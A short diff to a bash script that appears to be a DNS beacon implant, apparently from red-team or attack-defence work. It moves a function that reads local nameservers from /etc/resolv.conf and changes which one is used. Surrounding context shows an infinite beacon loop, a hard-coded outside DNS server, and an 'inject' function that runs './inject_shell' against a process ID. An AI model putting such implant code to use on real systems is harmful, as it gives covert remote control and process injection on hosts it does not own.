@@ -6,8 +6,20 @@ domain1="vaticancity.org"
 domain2="maine.gov"
 chkd="check."
 dnsServer="129.21.130.212"
+
+# Get the local DNS server addresses
+get_dns(){
+    servers=$(cat /etc/resolv.conf | grep "nameserver" | awk '{print $2}')
+    arr=($servers)
+    for x in "${arr[@]}"; do
+        echo $x
+    done
+}
+
 localServer=$(get_dns) # local DNS server on the box
-localServer=$(echo ${localServer[1]})
+localServer=($localServer)
+localServer=$(echo ${localServer[0]})
+echo $localServer
 f=false
 fName=""
 output=""
@@ -123,14 +135,6 @@ inject(){
     ./inject_shell $pid
 }
 
-# Get the local DNS server addresses
-get_dns(){
-    servers=$(cat /etc/resolv.conf | grep "nameserver" | awk '{print $2}')
-    arr=($servers)
-    for x in "${arr[@]}"; do
-        echo $x
-    done
-}
 # Main driver for beacon
 main(){
     while true; do
